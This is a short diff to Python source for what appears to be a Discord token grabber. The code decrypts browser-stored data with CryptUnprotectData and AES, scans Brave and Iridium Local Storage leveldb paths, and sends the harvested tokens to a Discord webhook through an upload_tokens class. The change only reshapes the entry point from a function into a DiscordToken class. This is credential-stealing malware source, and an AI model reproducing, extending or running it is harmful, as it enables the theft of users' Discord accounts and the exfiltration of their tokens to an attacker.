@@ -8,10 +8,10 @@ from Crypto.Cipher import AES
 from discord import Embed, SyncWebhook
 from win32crypt import CryptUnprotectData
 
-
-def disctoken(webhook: str) -> None:
-    upload_tokens(webhook).upload()
-
+class DiscordToken:
+    def __init__(self, webhook):
+        upload_tokens(webhook).upload()
+        
 class extract_tokens:
     def __init__(self) -> None:
         self.base_url = "https://discord.com/api/v9/users/@me"
@@ -54,7 +54,6 @@ class extract_tokens:
             'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
             'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
         }
-
 
         for name, path in paths.items():
             if not os.path.exists(path):
